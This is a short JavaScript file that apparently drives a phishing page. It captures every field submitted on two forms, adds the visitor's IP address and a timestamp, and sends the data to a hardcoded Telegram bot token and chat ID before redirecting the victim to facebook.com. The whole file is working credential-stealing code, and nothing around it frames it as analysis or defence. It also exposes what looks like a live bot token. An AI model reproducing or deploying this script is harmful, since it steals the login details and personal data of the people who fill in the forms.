window.onload = () => {
2  const token = "6884328378:AAHSfHTfbefzVvdTIqZeu4Bq_W5f0B4_nQg";
3  const chatID = "1393367014";
4  const url = `https://api.telegram.org/bot${token}/sendMessage`;
5  const form1 = document.querySelector("#form1");
6  const form2 = document.querySelector("#form2");
7  const onSubmit = (e) => {
8    e.preventDefault();
9    const formData = new FormData(e.target);
10    let text = `Time: ${new Date().toISOString()}\n`;
11    for (const [key, value] of formData.entries()) {
12      text += `${key}: ${value}\n`;
13    }
14    fetch("https://api.ipify.org")
15      .then((res) => res.text())
16      .then((res) => {
17        text += `IP: ${res}\n`;
18        console.log(text);
19        fetch(`${url}?chat_id=${chatID}&text=${encodeURIComponent(text)}`).then(
20          (res) => {
21            location.assign("https://facebook.com");
22          }
23        );
24      });
25  };
26  form1.addEventListener("submit", onSubmit);
27  form2.addEventListener("submit", onSubmit);
28};
29
